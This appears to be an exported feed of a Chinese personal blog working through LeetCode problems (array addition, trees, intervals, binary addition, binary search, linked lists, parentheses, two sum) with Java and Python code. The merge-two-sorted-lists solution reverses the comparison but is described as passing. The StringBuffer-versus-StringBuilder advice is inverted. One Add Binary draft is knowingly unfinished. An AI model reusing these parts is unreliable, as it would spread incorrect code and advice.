    <content type="text"><![CDATA[DescriptionFor a non-negative integer X, the array-form of X is an array of its digits in left to right order. For example, if X = 1231, then the array form is [1,2,3,1]. Given the array-form A of a non-negative integer X, return the array-form of the integer X+K. Example 1: 123Input: A = [1,2,0,0], K = 34Output: [1,2,3,4]Explanation: 1200 + 34 = 1234 Example 2: 123Input: A = [2,7,4], K = 181Output: [4,5,5]Explanation: 274 + 181 = 455 Example 3: 123Input: A = [2,1,5], K = 806Output: [1,0,2,1]Explanation: 215 + 806 = 1021 Example 4: 123Input: A = [9,9,9,9,9,9,9,9,9,9], K = 1Output: [1,0,0,0,0,0,0,0,0,0,0]Explanation: 9999999999 + 1 = 10000000000 Note： 1 &lt;= A.length &lt;= 10000 0 &lt;= A[i] &lt;= 9 0 &lt;= K &lt;= 10000 If A.length &gt; 1, then A[0] != 0 分析给一个数组形式的整数 X 和一个整数 K，求 X+K，其中 X 和 K 都是五位数以内的整数，所以无需考虑溢出。 拆解 K 成 Array-Form 类型得到一个整数，然后两个数组末位对齐，逐位相加即可。 拆解 K 的过程可以取余，余数与 X 的末位相加即可 1234while (K != 0) &#123; r = K % 10; K = K / 10;&#125; 程序设计根据上述分析，代码实现如下， 123456789101112131415161718192021222324252627282930313233343536373839404142434445class Solution &#123; public List&lt;Integer&gt; addToArrayForm(int[] A, int K) &#123; int carry = 0; for(int i = A.length-1; i &gt;= 0; i--)&#123; if (K!=0) &#123; int a = K%10; int b = A[i]; int sum = a + b + carry; carry = sum / 10; A[i] = sum % 10; K /= 10; &#125; else &#123; int sum = A[i] + carry; if( sum &lt; 10) &#123; A[i] = sum; carry = 0; break; &#125; else &#123; A[i] = sum % 10; carry = 1; &#125; &#125; &#125; List&lt;Integer&gt; ans = new ArrayList&lt;&gt;(); if(K != 0) &#123; K += carry; Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); while(K != 0) &#123; stack.push(K % 10); K /= 10; &#125; while(!stack.isEmpty()) &#123; ans.add(stack.pop()); &#125; &#125; else if(carry == 1) &#123; ans.add(1); &#125; for(int i = 0; i &lt; A.length; i++) &#123; ans.add(A[i]); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-771 Jewels and Stones]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-771-jewels-and-stones%2F</url>
    <content type="text"><![CDATA[DescriptionYou’re given strings J representing the types of stones that are jewels, and S representing the stones you have. Each character in S is a type of stone you have. You want to know how many of the stones you have are also jewels. The letters in J are guaranteed distinct, and all characters in J and S are letters. Letters are case sensitive, so &quot;a&quot; is considered a different type of stone from &quot;A&quot;. Example 1: 12Input: J = &quot;aA&quot;, S = &quot;aAAbbbb&quot;Output: 3 Example 2: 12Input: J = &quot;z&quot;, S = &quot;ZZ&quot;Output: 0 Note: S and J will consist of letters and have length at most 50. The characters in J are distinct. 分析给定两个字符串 J 和 S， J 代表珠宝类型，S 代表石头类型，在 S 中找出珠宝的个数。其中给定的字符串长度不超过 50，J 中的字符不重复。 最简单的想法是使用 Hash 存储 J 中的字符，然后遍历 S 中的每个字符，如果字符命中 Hash，则珠宝数量加 1。这种做法时间复杂度 O(n)，空间复杂度 O(n)，实现也简单，我看可行。 程序设计按照上述分析思路，使用 Python 实现如下， 12345678910111213141516class Solution: def numJewelsInStones(self, J: str, S: str) -&gt; int: if len(S) == 0 or len(J) == 0: return 0 jewels = 0 char_map = dict() for j in J: char_map[j] = True for s in S: if char_map.get(s): jewels += 1 return jewels 提交，也能 bugfree，但是 ac 结果显示内存使用打败 5.33% 的 Python 提交。如果要优化空间复杂度的花，可以使用一个长度为 128 的整型数组保存宝石的类型， Java 实现如下： 1234567891011121314151617181920class Solution &#123; public int numJewelsInStones(String J, String S) &#123; if (J.length() == 0 || S.length() == 0) &#123; return 0; &#125; int jewels = 0; int[] types = new int[128]; for (char c: J.toCharArray()) &#123; types[c-0] = 1; &#125; for (char c: S.toCharArray()) &#123; jewels += types[c-0]; &#125; return jewels; &#125;&#125; 提交后，时空复杂度都还可以。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Stringl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-617 Merge Two Binary Trees]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-617-merge-tow-binary-trees%2F</url>
    <content type="text"><![CDATA[DescriptionGiven two binary trees and imagine that when you put one of them to cover the other, some nodes of the two trees are overlapped while the others are not. You need to merge them into a new binary tree. The merge rule is that if two nodes overlap, then sum node values up as the new value of the merged node. Otherwise, the NOT null node will be used as the node of new tree. Example 1: 1234567891011121314Input: Tree 1 Tree 2 1 2 / \ / \ 3 2 1 3 / \ \ 5 4 7 Output: Merged tree: 3 / \ 4 5 / \ \ 5 4 7 Note: The merging process must start from the root nodes of both trees. 分析合并两棵二叉树，如果节点有交集则两个节点的和作为新节点，否则非空节点作为新节点。 从两棵树的 root 节点开始合并，假设合并到了某个节点 t，则考虑如下情况： 如果 t1 和 t2 都不为 null，那么 1234t.val = t1.val + t2.val;t.left = 递归(t1.left, t2.left);t.right = 递归(t1.right, t2.right);return t; 如果 t1 为 null，那么返回 t2 如果 t2 为 null，那么返回 t1 Solution根据分析，写出代码如下： 123456789101112131415161718192021/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public TreeNode mergeTrees(TreeNode t1, TreeNode t2) &#123; if (t1 == null) return t2; if (t2 == null) return t1; TreeNode t = new TreeNode(t1.val+t2.val); t.left = mergeTrees(t1.left, t2.left); t.right = mergeTrees(t1.right, t2.right); return t; &#125;&#125; 一遍过，bugfree~~]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Tree</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-121 Best Time to Buy and Sell Stock]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-121-best-time-to-buy-and-sell-stock%2F</url>
    <content type="text"><![CDATA[DescriptionSay you have an array for which the ith element is the price of a given stock on day i. If you were only permitted to complete at most one transaction (i.e., buy one and sell one share of the stock), design an algorithm to find the maximum profit. Note that you cannot sell a stock before you buy one. Example 1: 1234Input: [7,1,5,3,6,4]Output: 5Explanation: Buy on day 2 (price = 1) and sell on day 5 (price = 6), profit = 6-1 = 5. Not 7-1 = 6, as selling price needs to be larger than buying price. Example 2: 123Input: [7,6,4,3,1]Output: 0Explanation: In this case, no transaction is done, i.e. max profit = 0. 动态规划分治和动态规划：不相交的子问题、相交的子问题 从斐波那契开始 最优解 vs 最优解的值 朴素递归 —— 自顶向下 因为子问题一般是重叠的，采用自顶向下的方式计算最优解的值会重复对多个相同的子问题求解，时间复杂度和空间复杂度都会指数增长。而自底向上的求解过程是递推式的进行，会先计算最基础的子问题，然后将子问题的结果缓存（可以仅仅缓存和下一个状态相关的子问题的解），所以我们一般采用自底向上的方式求解最优解的值。 带备忘录的自顶向下 一般步骤： 刻画一个最优解的结构特征。 递归定义最优解的值。 计算最优解的值，通常采用自底向上的方法。 利用计算出的信息构造一个最有解（可选）。 程序设计1234567891011121314151617class Solution &#123; public int maxProfit(int[] prices) &#123; if (null == prices || prices.length == 0) &#123; return 0; &#125; int[] dp = new int[prices.length]; dp[0] = 0; int min = prices[0]; for (int i = 1; i &lt; prices.length; i++) &#123; min = Math.min(min, prices[i]); dp[i] = Math.max(dp[i-1], prices[i]-min); &#125; return dp[prices.length - 1]; &#125;&#125; 内存优化 12345678910111213141516class Solution &#123; public int maxProfit(int[] prices) &#123; if (null == prices || prices.length == 0) &#123; return 0; &#125; int profit = 0; int min = prices[0]; for (int i = 1; i &lt; prices.length; i++) &#123; min = Math.min(min, prices[i]); profit = Math.max(profit, prices[i]-min); &#125; return profit; &#125;&#125; LIS 数量 定义问题 给定一个序列 $ X = &lt;x_1, x_2, …, x_n&gt; $，如果 $ Z = &lt;z_1, z_2, … z_i&gt; $ 是 X 的子序列，且满足： $ z_i &gt; z_(i-1) $，则 Z 是 X 的递增子序列 ，其中元素最多的递增子序列叫做 X 的最长递增子序列 (LIS) 刻画 LIS 的特征 假设 $ Z = &lt;z_1, z_2, … z_i&gt; $ 是 X 的一个 LIS， 那么 $Z_i &gt; Z_(i-1)$ 求 LIS 的长度 TODO LIST https://leetcode.com/problems/number-of-longest-increasing-subsequence/ https://leetcode.com/problems/longest-arithmetic-sequence/ https://leetcode.com/problems/predict-the-winner/ https://leetcode.com/problems/minimum-ascii-delete-sum-for-two-strings/ https://leetcode.com/problems/filling-bookcase-shelves/ DP AC https://leetcode.com/problems/longest-continuous-increasing-subsequence/submissions/ https://leetcode.com/problems/delete-operation-for-two-strings/ https://leetcode.com/problems/number-of-longest-increasing-subsequence/]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Dynamic Programming</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-435 non-overlapping intervals]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-435-non-overlapping-intervals%2F</url>
    <content type="text"><![CDATA[DescriptionGiven a collection of intervals, find the minimum number of intervals you need to remove to make the rest of the intervals non-overlapping. Note: You may assume the interval’s end point is always bigger than its start point. Intervals like [1,2] and [2,3] have borders “touching” but they don’t overlap each other. Example 1: 12345Input: [ [1,2], [2,3], [3,4], [1,3] ]Output: 1Explanation: [1,3] can be removed and the rest of intervals are non-overlapping. Example 2: 12345Input: [ [1,2], [1,2], [1,2] ]Output: 2Explanation: You need to remove two [1,2] to make the rest of intervals non-overlapping. Example 3: 12345Input: [ [1,2], [2,3] ]Output: 0Explanation: You don&apos;t need to remove any of the intervals since they&apos;re already non-overlapping. NOTE: input types have been changed on April 15, 2019. Please reset to default code definition to get new method signature. 分析 首先以第一个元素的为基准对各个区间排序 初始化冲突计数器为 0，设置两个指针，一前一后，每个指针指向一个区间 如果两个指针指向的区间有冲突，则前指针指向最小覆盖的区间，后指针向后移动一个区间，冲突计数器加一 如果两指针指向的区间没有冲突，则两指针平滑向后移动一个区间 返回冲突计数器中的值。 程序设计储备知识 Java 比较器 区间的排序是依据第一个元素进行比较操作的。Java 有两种方式提供比较功能，其一是实现 Comparable 接口，使类具有比较的功能。第二种是实现 Comperator 接口，比较规则定义在该接口提供的 compare 方法中。 1234567891011121314class IntervalComparator implements Comparator&lt;Interval&gt; &#123; public int compare(Interval a, Interval b) &#123; return a.start - b.start; &#125;&#125;// 其中 Interval 对象定义如下class Interval &#123; int start, end; Interval(int start, int end) &#123; this.start = start; this.end = end; &#125;&#125; 在 Java 8 中，还可以使用 Lambda 表达式创建比较器，如下 1Arrays.sort(intervals, (Interval x, Interval y) -&gt; x.start - y.start); 代码如下 123456789101112131415161718192021class Solution &#123; public int eraseOverlapIntervals(int[][] intervals) &#123; if (null == intervals || intervals.length == 0) &#123; return 0; &#125; int conflict = 0; int j = 0; Arrays.sort(intervals, (int[] x, int[] y) -&gt; x[0] - y[0] ); for (int i = 1; i &lt; intervals.length; i++) &#123; if (intervals[j][1] &gt; intervals[i][0]) &#123; conflict++; // j point min zone j = intervals[j][1] &lt; intervals[i][1] ? j : i; &#125; else &#123; j = i; &#125; &#125; return conflict; &#125;&#125; 本例使用的是贪心思想，如果有冲突，则指针指向最小覆盖区间，这就是贪心的思想。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Tree</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-101 —— Symmetric Tree]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-101-symmetric-tree%2F</url>
    <content type="text"><![CDATA[DescriptionGiven a binary tree, check whether it is a mirror of itself (ie, symmetric around its center). For example, this binary tree [1,2,2,3,4,4,3] is symmetric: 12345 1 / \ 2 2 / \ / \3 4 4 3 But the following [1,2,2,null,3,null,3] is not: 12345 1 / \2 2 \ \ 3 3 Note:Bonus points if you could solve it both recursively and iteratively. 分析如果一个树是镜像树，那么这颗树有如下特点， 左子树的 left-root-right 遍历和右子树的 right-root-left 遍历结果一致 左子树的左节点和右子树的右节点值相等，并且左子树的左子树是右子树的右子树的镜像 左子树的右节点和右子树的左节点值相等，并且左子树的右子树是右子树的左子树的镜像 根据第 1 条特点可以写出非递归算法，根据 2、3 两条可以写出递归算法。 递归写法根据分析得出的 2、3 特性，代码实现如下； 1234567891011121314151617181920212223242526/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public boolean isSymmetric(TreeNode root) &#123; return root == null || isIndentical(root.left, root.right); &#125; private boolean isIndentical(TreeNode front, TreeNode back) &#123; if (front == null || back == null) &#123; return front == back; &#125; if (back.val != front.val) &#123; return false; &#125; return isIndentical(front.right, back.left) &amp;&amp; isIndentical(front.left, back.right); &#125;&#125; 提交后，得分不高，运行时打败 31%。 非递归解法未完，待续…]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Tree</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-100 —— Same Tree]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-100-same-tree%2F</url>
    <content type="text"><![CDATA[DescriptionGiven two binary trees, write a function to check if they are the same or not. Two binary trees are considered the same if they are structurally identical and the nodes have the same value. Example 1: 1234567Input: 1 1 / \ / \ 2 3 2 3 [1,2,3], [1,2,3]Output: true Example 2: 1234567Input: 1 1 / \ 2 2 [1,2], [1,null,2]Output: false Example 3: 1234567Input: 1 1 / \ / \ 2 1 1 2 [1,2,1], [1,1,2]Output: false 分析处理树的问题一般都离不开递归的思想，我们先把问题分解为两个子问题， 根节点相等 两颗树的左子树和右子树分别相等 程序设计基于以上分析不难写出代码，如下， 123456789101112131415161718/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public boolean isSameTree(TreeNode p, TreeNode q) &#123; if (p == null || q == null) &#123; return p == q; &#125; return p.val == q.val &amp;&amp; isSameTree(p.left, q.left) &amp;&amp; isSameTree(p.right, q.right); &#125;&#125; 哈哈，提交后一遍过了，写了这么久终于实现了第一次 bugfree，值得纪念。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Binary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-67 —— Add Binary]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-67-add-binary%2F</url>
    <content type="text"><![CDATA[DescriptionGiven two binary strings, return their sum (also a binary string). The input strings are both non-empty and contains only characters 1 or 0. Example 1: 12Input: a = &quot;11&quot;, b = &quot;1&quot;Output: &quot;100&quot; Example 2: 12Input: a = &quot;1010&quot;, b = &quot;1011&quot;Output: &quot;10101&quot; 分析给定两个只包含 0 和 1 的非空字符串，求他们的二进制和。有题意得知，题目给定的字符串是合法的，可以省略输入合法性校验。 我们需要考虑的如下两个问题： a 和 b 的长度不一样 进位问题 (carry) 按如下步骤， 先选择字符串长度较小者为基准对字符串做反向遍历 每次遍历对对应字符和进位求和 ，再对和对 2 分别取余和取整，余数插入新字符串的头部，整数作为进位。 重复步骤 2 直到循环结束。 循环结束后如果进位非 0，则进位再与剩下的字符相加(如果有剩余字符) 返回结果 朴素解法储备知识 String vs StringBuilder 在 Java 中，和常量一样 String 是不可变的(immutable) ，因此，对字符串做可变(insert/update/delete等)操作时，会产生新的字符串，旧的字符串会当作垃圾丢弃。频繁的字符串操作严重降低了性能，对垃圾回收造成较大压力，所以 Java 提供 StringBuilder 类型用于字符串的可变操作， StringBuilder 提供了 append、delete、insert 等接口。 StringBuilder vs StringBuffer StringBuffer 和 StringBuilder 类似，也是用于字符串的可变操作。然而任何操作在多线程中都会存在状态同步(原子操作/一致性)问题，StringBuffer 是线程安全的，因此开销会大一些，在单线程中使用 StringBuffer 对字符串做操作是较好的选择。 StringBuilder 提供的接口 StringBuilder 含有 String 的大部分方法(是否是继承同一个父类？或实现同一个接口？没做过调查) 想要的操作 提供的接口 注解 追加一个字符串 append(String s) 也可以追加 char/int/boolean等类型，功能和 + 类似 删除指定位置的字符 deleteCharAt(int index) 指定位置插入字符 insert(int offset, char x) 也可以插入String/int/boolean 等 代码 按照如上分析，我们可以使用 StringBuilder 对字符串做操作，使用其提供的 insert 方法实现头部插入，具体如下(代码未实现完) 123456789101112131415161718192021222324252627282930313233343536373839class Solution &#123; public String addBinary(String a, String b) &#123; int aLen = a.length(); int bLen = b.length(); int i, j; if (aLen &lt; bLen) &#123; i = aLen - 1; j = bLen - aLen - 1; &#125; else &#123; i = bLen - 1; j = aLen - bLen - 1; &#125; StringBuilder result = new StringBuilder(); int carry = 0; while (i &gt;= 0) int sum = (a.charAt(i) - '0') + (b.charAt(i) - '0') + carry; carry = (sum &gt;&gt; 1); result.insert(0, sum % 2); i--; &#125; while (j &gt;= 0) &#123; // int sum = (a.charAt(i) - '0') + (b.charAt(i) - '0') + carry; carry = (sum &gt;&gt; 1); result.insert(0, sum % 2); j--; &#125; if (carry &gt; 0) &#123; result.insert(0, carry); &#125; result.toString(); &#125;&#125; 写了 80% 的时候发现，特殊逻辑太多，进来先判断 a 和 b 的长度，后续还要做一次判断，该方法太繁琐，我决定再作思考，优化特殊逻辑。 刚去了一趟厕所，想了一下可以在循环体中做特殊逻辑，如下， 12345678910111213141516171819202122232425262728293031class Solution &#123; public String addBinary(String a, String b) &#123; int i = a.length() - 1; int j = b.length() - 1; StringBuilder result = new StringBuilder(); int carry = 0; while (i &gt;= 0 || j &gt;= 0) &#123; int num1 = 0; int num2 = 0; if (i &gt;= 0) &#123; num1 = (a.charAt(i) - '0'); &#125; if (j &gt;= 0) &#123; num2 = (b.charAt(j) - '0'); &#125; int sum = num1 + num2 + carry; carry = (sum &gt;&gt; 1); result.insert(0, sum % 2); i--; j--; &#125; if (carry &gt; 0) &#123; result.insert(0, carry); &#125; return result.toString(); &#125;&#125; 提交后 Ac 了，内存使用打败 99.94%，时间就刚刚及格，62.66%。分析了以下，慢的原因是多次头部插入 result.insert，像这个问题，每次遍历的时候会往头部插入，最后输出有从头开始，很典型的先进后出问题，用栈优化以下就好啦。 使用 Stack123456789101112131415161718192021222324252627282930313233343536class Solution &#123; public String addBinary(String a, String b) &#123; int i = a.length() - 1; int j = b.length() - 1; Stack&lt;Integer&gt; bucket = new Stack&lt;&gt;(); StringBuilder result = new StringBuilder(); int carry = 0; while (i &gt;= 0 || j &gt;= 0) &#123; int num1 = 0; int num2 = 0; if (i &gt;= 0) &#123; num1 = (a.charAt(i) - '0'); &#125; if (j &gt;= 0) &#123; num2 = (b.charAt(j) - '0'); &#125; int sum = num1 + num2 + carry; carry = (sum &gt;&gt; 1); bucket.push(sum % 2); i--; j--; &#125; if (carry &gt; 0) &#123; bucket.push(carry); &#125; while (!bucket.isEmpty()) &#123; result.append(bucket.pop()); &#125; return result.toString(); &#125;&#125; 本来打算使用 Stack 优化朴素算法中的频繁 Insert 问题，结果花费了 3ms，之战胜了 13% 的提交，最终参考了别人的提交，优化思路是每次都在结果中 append，最后在 reverse 字符串。 先 Append 后 Reverse12345678910111213141516171819202122232425262728293031class Solution &#123; public String addBinary(String a, String b) &#123; int i = a.length() - 1; int j = b.length() - 1; StringBuilder result = new StringBuilder(); int carry = 0; while (i &gt;= 0 || j &gt;= 0) &#123; int num1 = 0; int num2 = 0; if (i &gt;= 0) &#123; num1 = (a.charAt(i) - '0'); &#125; if (j &gt;= 0) &#123; num2 = (b.charAt(j) - '0'); &#125; int sum = num1 + num2 + carry; carry = (sum &gt;&gt; 1); result.append(sum % 2); i--; j--; &#125; if (carry &gt; 0) &#123; result.append(carry); &#125; return result.reverse().toString(); &#125;&#125; 果然，提交后内存和时间基本都是最优状态。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Binary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-35 —— Search Insert Position]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-35-search-insert-position%2F</url>
    <content type="text"><![CDATA[DescriptionGiven a sorted array and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order. You may assume no duplicates in the array. Example 1: 12Input: [1,3,5,6], 5Output: 2 Example 2: 12Input: [1,3,5,6], 2Output: 1 Example 3: 12Input: [1,3,5,6], 7Output: 4 Example 4: 12Input: [1,3,5,6], 0Output: 0 分析在一个给定的有序数组中查找给定的值，如果找到返回该值在数组中的位置，否则返回该值所应该处于的位值。 给定的数组是有序的，而且已经假设没有重复的元素，显然二分查找是一种比较容易想到的解决方案。解决问题时，考虑以下 corner case, 给定的数组为空或 null 给定的 target 比数组最小值小 给定的 target 比数组最大值大 测试用例根据分析给出的 corner case, 题目给出的测试用例已经基本覆盖，只需再加上给定数组为空的情况 12Input: [], 2Output: 0 程序设计123456789101112131415161718192021222324252627class Solution &#123; public int searchInsert(int[] nums, int target) &#123; if (null == nums || nums.length == 0) &#123; return 0; &#125; int left = 0; int right = nums.length - 1; if (target &gt; nums[right]) &#123; return right + 1; &#125; if (target &lt; nums[left]) &#123; return 0; &#125; while (left &lt;= right) &#123; int mid = left + ((right - left) &gt;&gt; 1); if (target &gt; nums[mid]) &#123; left = mid + 1; &#125; else if (target &lt; nums[mid]) &#123; right = mid - 1; &#125; else &#123; return mid; &#125; &#125; return left; &#125;&#125; 注意: 即便数组只有一个元素也要进行二分查找，因此 while 循环中的条件是 left &lt;= right ，要有 = 如果进入 while 循环且查找失败，则 left 的值一定大于 right，此时 left 的位置正好代表查找元素所应该处于的位置，所以返回 left. 计算 mid 时候，考虑大数相加溢出，因此使用 mid = left + ((right - left) &gt;&gt; 1) 计算 mid 的值，其中 &gt;&gt; 是位运算，相当于 /，如果您不熟悉位运算可以改为如下表达式mid = left + (right - left)/2 代码提交后，运行时打败 100.00% 的提交，内存打败 98.22% 的提交，可以说近乎完美。]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Search</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-21 —— Merge two sorted lists]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-21-merge-two-sorted-lists%2F</url>
    <content type="text"><![CDATA[DescriptionMerge two sorted linked lists and return it as a new list. The new list should be made by splicing together the nodes of the first two lists. Example: 12Input: 1-&gt;2-&gt;4, 1-&gt;3-&gt;4Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4 分析合并两个有序链表，合并后的链表也应是有序的，而且重复元素不去重 假设有 a, b 两个链表，考虑以下 corner case: 其中一个链表为 null a 的末尾元素大于 b 的首元素 a 的元素个数比 b 多 常规的解法就是遍历两个列表，为新生成的链表维护一个头指针 dummyHead 和一个滑动指针cur，另外分别为两个给定的链表维护一个指针，假设为 a, b，按如下规则遍历 初始化 dummyHead 和 cur， 让 dummyHead = cur 初始化 a, b 分别指向两个链表的头节点 比较 a, b ，让小的一个节点作为 cur 的 next 节点，并且指针向后移动一位, cur 同样向后移动一位 重复 3，直到 a, b 两个指针之一为空 如果 a, b 中还有非空指针，让其作为 cur 的 next 节点 返回 dummyHead 的 next 节点 程序设计1234567891011121314151617181920212223242526272829303132333435/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode mergeTwoLists(ListNode l1, ListNode l2) &#123; ListNode cur = new ListNode(0); ListNode dummyHead = cur; while (l1 != null &amp;&amp; l2 != null) &#123; if (l1.val &gt; l2.val) &#123; cur.next = l1; l1 = l1.next; &#125; else &#123; cur.next = l2; l2 = l2.next; &#125; cur = cur.next; &#125; if (l1 != null) &#123; cur.next = l1; &#125; if (l2 != null) &#123; cur.next = l2; &#125; return dummyHead.next; &#125;&#125; 值得注意的是，此处采用 dummyHead 作为新链表的头节点，最终返回了 dummyHead.next，这样做（比起先比较 L1 和 L2 的头节点然后选中较小者作为新链表的头节点）将特殊问题一般化，减少了特殊逻辑的处理，是很值得学习的一种思路。 如上代码，提交后运行时 0 ms, 打败 100% 的提交。 其他解法 递归解法]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-20 —— Valid Parentheses]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-20-valid-parentheses%2F</url>
    <content type="text"><![CDATA[DescriptionGiven a string containing just the characters &#39;(&#39;, &#39;)&#39;, &#39;{&#39;, &#39;}&#39;, &#39;[&#39; and &#39;]&#39;, determine if the input string is valid. An input string is valid if: Open brackets must be closed by the same type of brackets. Open brackets must be closed in the correct order. Note that an empty string is also considered valid. Example 1: 12Input: &quot;()&quot;Output: true Example 2: 12Input: &quot;()[]&#123;&#125;&quot;Output: true Example 3: 12Input: &quot;(]&quot;Output: false Example 4: 12Input: &quot;([)]&quot;Output: false Example 5: 12Input: &quot;&#123;[]&#125;&quot;Output: true 测试用例根据题意，每个输入都有解，因此数组元素个数一定是大于 2 1234567891011// 空字符串 和 null""null// 右括号开头 ")()("// 字符串长度为奇数"()()("// 正常测试用例"((&#123;&#125;[])())"// 只有右括号"((((" 分析如果一个有括号组成的字符串是“有效的”，那么这个字符串应该具有以下特点： 字符串的长度应该是偶数 字符串中的括号有顺序的成对出现 基于以上两个特点，我们只需要遍历字符串，然后检查每个左括号是否有合法的右括号，具体操作时，可以采用消去法，如下图示意， 在没有遇到左括号时，我们不知道它是否能成功配对，因此我们需要先将其存储，直到遇到与之配对的右括号时再消去。从左往右遍历，观察不难发现，多个相连的左括号中，越靠左的越先访问到，却越往后被消去（先进后出），所以我们可以毫不犹豫的选择使用 Stack 存储优先访问到左括号，当遍历完成后，如果 Stack 中的所有左括号都被消去(Stack 为空)，则说明是“有效”字符串。综上所述，得出以下特性， 右括号开头一定不满足 基于 1 的推广，栈空条件下遇到右括号也一定不满足 null 一定不满足，但是题目交代了空字符认为满足 字符串长度为奇数的一定也不满足 使用 Stack 解题预备知识 位运算判断整数的奇偶性 一个整数在表示为二进制时，某位非 0 即 1，因此该整数和 1 按位与，如果是奇数（末位是1）则结果为 1，否则结果为 0 运算符的优先级 运算符的优先级中， == 优先于 &amp; 优先于 || 建议： 如果记不住优先级顺序可以使用 () Java 中的 foreach 循环 遍历数组时，如果我们并不关心每个元素的索引，那么可以使用 foreach，语法如下： 12345int[] examples = &#123;100, 101, 102&#125;;for (int x: examples) &#123; // do something // x on behalf of each item&#125; Java 中的 Stack 想要的操作 提供的方法 备注 查看栈顶元素 peek() 弹出栈顶元素 pop() 压栈 push() 判断栈是否为空 empty() 或者 isEmpty() 实现的接口不同，所以方法差异 程序设计 1234567891011121314151617181920212223class Solution &#123; public boolean isValid(String s) &#123; if (null == s || (s.length() &amp; 1) == 1 ) &#123; return false; &#125; Stack&lt;Character&gt; parentheses = new Stack&lt;&gt;(); for (char x: s.toCharArray()) &#123; if (isLeftBracket(x)) &#123; parentheses.push(x); &#125; else &#123; if (parentheses.empty()) &#123; return false; &#125; char leftBracket = parentheses.pop(); if (!isMatch(leftBracket, x)) &#123; return false; &#125; &#125; &#125; return parentheses.empty(); &#125;&#125; 其中 isLeftBracket() 方法用于判断字符是否是左括号，实现可以参考如下： 123private boolean isLeftBracket(char x) &#123; return x == '(' || x == '[' || x == '&#123;';&#125; isMatch() 用于判断左右两个括号是否匹配，查看了 ASCII 后发现左右括号的 ASCII 相差 1 或 2，具体参考如下： 123456private boolean isMatch(char left, char right) &#123; if (left == '(') &#123; return right - left == 1; &#125; return right - left == 2;&#125; 提交后，运行时 1ms，打败 98.31% 其他解法 大神们的骚操作]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode-01 —— Two Sum]]></title>
    <url>%2Ffundamental%2Falgorithm%2Flc-01-two-sum%2F</url>
    <content type="text"><![CDATA[DescriptionGiven an array of integers, return indices of the two numbers such that they add up to a specific target. You may assume that each input would have exactly one solution, and you may not use the same element twice. Example: 1234Given nums = [2, 7, 11, 15], target = 9,Because nums[0] + nums[1] = 2 + 7 = 9,return [0, 1]. 测试用例根据题意，每个输入都有解，因此数组元素个数一定是大于 2 1234567891011// 普通测试用例[3, 4, 2, 1]6// 重复元素测试[1, 1, 2]2[1, 1, 1, 1, 1]2// 元素只能使用一次测试用例[4, 1, 3]4 朴素算法储备知识 Java 数组定义 12345678int[] arr; // 申明引用变量int[] arr = new int[10]; // 申明引用并且绑定(分配内存)int[] arr = &#123;1, 2, 3&#125;; // 申明并且初始化：绑定 + 初始化new int[]&#123;1, 2, 3&#125;; // 创建数组对象，不与引用变量做地址绑定，一般用于函数的 return 中，如下：public int[] makeArray(int a, int b) &#123; return new int[]&#123;a, b&#125;;&#125; Solution 两层循环，需要特别注意的是每个元素只能使用一次，因此需要添加判断条件 i != j： 12345678910111213class Solution &#123; public int[] twoSum(int[] nums, int target) &#123; for(int i = 0; i &lt; nums.length; i++) &#123; for(int j = 0; j &lt; nums.length; j++) &#123; if(i != j &amp;&amp; nums[i] + nums[j] == target) &#123; return new int[]&#123;i, j&#125;; &#125; &#125; &#125; return null; &#125;&#125; 使用 